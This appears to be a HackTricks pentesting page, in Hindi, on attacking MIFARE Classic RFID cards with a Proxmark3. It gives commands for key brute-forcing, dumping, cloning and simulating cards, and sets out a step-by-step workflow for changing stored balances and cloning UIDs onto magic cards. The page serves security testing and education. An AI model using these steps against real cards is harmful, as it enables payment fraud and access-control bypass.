# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Proxmark3 से RFID Systems पर हमला करना

Actively maintained RRG/Iceman Proxmark3 client और उससे मेल खाने वाला firmware install करें। फिर उसी build के साथ command syntax की पुष्टि करें, क्योंकि नीचे दिए गए पुराने commands बदल चुके हो सकते हैं।<sup>[[1]](#references)[[5]](#references)</sup>

### MIFARE Classic 1KB पर हमला करना

MIFARE Classic 1K में **16 sectors** होते हैं, जिनमें से हर एक में **16 bytes के 4 blocks** होते हैं। Genuine NXP cards में manufacturer block 0 में UID/manufacturer data होता है और यह read-only होता है; special clone या “magic” cards में इसे फिर से लिखना संभव हो सकता है।<sup>[[1]](#references)[[2]](#references)</sup>\
हर sector तक पहुँचने के लिए आपको **2 keys** (**A** और **B**) चाहिए, जो **हर sector के block 3** (sector trailer) में stored होती हैं। Sector trailer में **access bits** भी stored होते हैं, जो 2 keys का उपयोग करके **हर block** पर **read और write** permissions तय करते हैं।\
उदाहरण के लिए, अगर आपको पहली key पता हो, तो वह read permissions देने के लिए और दूसरी key write permissions देने के लिए उपयोगी होती है।

कई attacks किए जा सकते हैं।

```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```

Proxmark3 अन्य कार्रवाइयाँ भी कर सकता है, जैसे **Tag to Reader communication** को **eavesdropping** करके संवेदनशील डेटा ढूँढ़ने की कोशिश करना। इस कार्ड में आप संचार को सिर्फ sniff कर सकते हैं और इस्तेमाल की गई key की गणना कर सकते हैं, क्योंकि इस्तेमाल किए गए **cryptographic operations कमजोर हैं** और plain text तथा cipher text जानने पर आप इसकी गणना कर सकते हैं (`mfkey64` tool)।<sup>[[3]](#references)</sup>

#### Stored-value abuse के लिए MiFare Classic का त्वरित वर्कफ़्लो

जब टर्मिनल Classic कार्ड पर बैलेंस स्टोर करते हैं, तो आम तौर पर शुरू से अंत तक यह प्रक्रिया अपनाई जाती है:<sup>[[4]](#references)</sup>

```bash
# 1) Recover sector keys and dump full card
proxmark3> hf mf autopwn

# 2) Modify dump offline (adjust balance + integrity bytes)
#    Use diffing of before/after top-up dumps to locate fields

# 3) Write modified dump to a UID-changeable ("Chinese magic") tag
proxmark3> hf mf cload -f modified.bin

# 4) Clone original UID so readers recognize the card
proxmark3> hf mf csetuid -u <original_uid>
```

नोट्स

- `hf mf autopwn` nested/darkside/HardNested-शैली के हमलों को orchestrate करता है, keys recover करता है, और client dumps folder में dumps बनाता है।<sup>[[1]](#references)</sup>
- block 0/UID लिखना केवल magic gen1a/gen2 cards पर काम करता है। सामान्य Classic cards में UID read-only होता है।<sup>[[2]](#references)</sup>
- कई deployments में Classic "value blocks" या simple checksums का इस्तेमाल होता है। Editing के बाद सुनिश्चित करें कि सभी duplicated/complemented fields और checksums consistent हों।<sup>[[4]](#references)</sup>

उच्च-स्तरीय methodology और mitigations के लिए देखें:

{{#ref}}
pentesting-rfid.md
{{#endref}}

### Raw Commands

IoT systems कभी-कभी **nonbranded या noncommercial tags** का इस्तेमाल करते हैं। इस स्थिति में, आप tags को custom **raw commands भेजने** के लिए Proxmark3 का इस्तेमाल कर सकते हैं।

```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
  proprietary non iso14443-4 card found, RATS not supported
  No chinese magic backdoor command detected
  Prng detection: WEAK
  Valid ISO14443A Tag Found - Quitting Search
```

इस जानकारी के आधार पर, आप कार्ड और उससे संचार करने के तरीके के बारे में जानकारी खोजने की कोशिश कर सकते हैं। Proxmark3 raw commands भेजने की सुविधा देता है, जैसे: `hf 14a raw -p -b 7 26`

### स्क्रिप्ट्स

Proxmark3 सॉफ़्टवेयर में **स्वचालन स्क्रिप्ट्स** की एक पहले से लोड की गई सूची होती है, जिनका उपयोग आप आसान कार्य करने के लिए कर सकते हैं। पूरी सूची पाने के लिए `script list` command का उपयोग करें। इसके बाद, `script run` command के बाद स्क्रिप्ट का नाम दें:

```
proxmark3> script run mfkeys
```

आप **tag readers को fuzz** करने के लिए एक script बना सकते हैं। किसी **valid card** का data कॉपी करने के बाद, बस एक **Lua script** लिखें जो एक या अधिक **bytes** को **randomize** करे और हर iteration में जाँचे कि **reader crash** होता है या नहीं।

## References

- [1] [Proxmark3 wiki: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [2] [Proxmark3 wiki: HF Magic cards](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [3] [MIFARE Classic Crypto1 पर NXP का बयान](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [4] [KioSoft Stored Value में NFC card vulnerability का exploitation (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)
- [5] [RRG/Iceman Proxmark3 — Linux installation](https://github.com/RfidResearchGroup/proxmark3/blob/master/doc/md/Installation_Instructions/Linux-Installation-Instructions.md)
{{#include ../../banners/hacktricks-training.md}}
